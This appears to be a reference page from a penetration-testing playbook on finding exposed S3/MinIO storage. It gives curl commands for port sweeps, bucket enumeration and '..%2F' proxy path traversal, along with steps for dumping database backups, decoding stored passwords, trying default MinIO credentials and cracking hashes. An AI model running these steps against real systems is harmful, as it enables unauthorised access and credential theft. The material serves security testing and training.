# Multi-Port and Backend Storage Discovery (S3 / MinIO / DB Backups)

## When this applies

- Containerized application that exposes multiple ports on the same host.
- nginx proxies the frontend but a backend storage service (MinIO, S3-compatible, custom) is reachable on an alternate port.
- Application proxies file requests through `/api/s3/...` paths (path-traversal candidate).

## Technique

Sweep alternate ports for HTTP services, identify any S3-like APIs (`ListBuckets` returns XML), enumerate buckets/objects. If only the proxy is reachable, use URL-encoded path traversal (`..%2F`) to escape the intended bucket.

## Steps

### Alternate port scanning

```bash
# Quick port scan for common service ports
for port in 80 443 3000 4000 5000 8000 8080 8333 8443 8888 9000 9090 9200 27017; do
  curl -s -o /dev/null -w "[Port $port] HTTP %{http_code}\n" "http://TARGET:$port/" --connect-timeout 2
done
```

**Docker/container environments** commonly expose multiple services via separate ports on the same host (e.g., nginx proxying to both a frontend and a storage backend).

### S3 / object storage enumeration

When you discover an S3-compatible service (port 8333, 9000/MinIO, or custom):

```bash
# List all buckets (S3 ListBuckets API — GET /)
curl -s http://TARGET:PORT/ | xmllint --format -

# List objects in a bucket (S3 ListObjects API — GET /bucket-name)
curl -s http://TARGET:PORT/BUCKET_NAME | xmllint --format -

# Download a specific object
curl -s http://TARGET:PORT/BUCKET_NAME/KEY -o output_file
```

**Common bucket names to enumerate:**
```
assets, backups, backup, data, db, database, dump, dumps, exports,
files, images, internal, logs, media, private, public, secrets,
static, storage, temp, uploads, users
```

### Accessing storage through application proxy endpoints

If the app serves files through a proxy (e.g., `<img src="/api/s3/photo.jpg">`), use URL-encoded path traversal to escape the intended bucket:

```bash
# Traverse from assets/ to backups/ bucket
curl http://target/api/s3/..%2Fbackups%2Fdatabase.db -o database.db

# Fuzz bucket/file combinations
for bucket in backups backup data db; do
  for file in app.db database.db backup.db users.db dump.sql; do
    SIZE=$(curl -s "http://target/api/s3/..%2F${bucket}%2F${file}" | wc -c)
    [ "$SIZE" -gt 100 ] && echo "[+] $bucket/$file: $SIZE bytes"
  done
done
```

See `server-side/reference/scenarios/ssrf/proxy-path-traversal.md` for the full proxy SSRF technique.

### What to look for in storage buckets

- Database backups (`.db`, `.sql`, `.dump`, `.bak`) — extract credentials, user data
- Configuration files (`.env`, `.yml`, `.json`, `.conf`) — extract secrets, API keys
- Source code archives (`.tar.gz`, `.zip`) — review for vulnerabilities
- Log files — extract session tokens, internal paths
- Private keys (`.pem`, `.key`) — direct authentication

### Database backup extraction

When a database file is found in object storage or backup directories:

```bash
# SQLite
sqlite3 downloaded.db ".tables"
sqlite3 downloaded.db "SELECT * FROM users;"

# MySQL dump
mysql -u root < dump.sql

# Check for password encoding patterns
# Base64-encoded passwords: decode to get raw password
echo "BASE64_PASSWORD" | base64 -d
```

**Password storage patterns to recognize:**
- **Plain base64**: `base64(raw_password)` — decode directly
- **Hex encoding**: `hex(raw_password)` — convert with `xxd -r -p`
- **MD5/SHA hashes**: crack with hashcat/john
- **bcrypt/scrypt**: brute-force only (slow)
- **Double encoding**: `base64(escape(raw_password))` — decode base64 first, then un-escape HTML entities

## Verifying success

- Direct port probe returns S3 XML `ListBucketsResult`.
- Bucket / object enumeration returns object keys.
- Downloaded `.db` opens in `sqlite3` and exposes user table with extractable credentials.

## Common pitfalls

- Some MinIO instances require auth even for ListBuckets — try anonymous first, then known default creds (`minioadmin:minioadmin`).
- Path traversal via `..%2F` may be normalized at the proxy — try double-encoding `..%252F`.
- Some S3 servers respond identically to invalid bucket names; confirm with a known-good bucket like `BUCKET_NAME` of length 0 or `/`.

## Tools

- nmap, masscan (port discovery)
- curl, xmllint
- s3-account-search, awsbucketdump (S3 enumeration)
- sqlite3, mysql client
- hashcat, john (cracking)
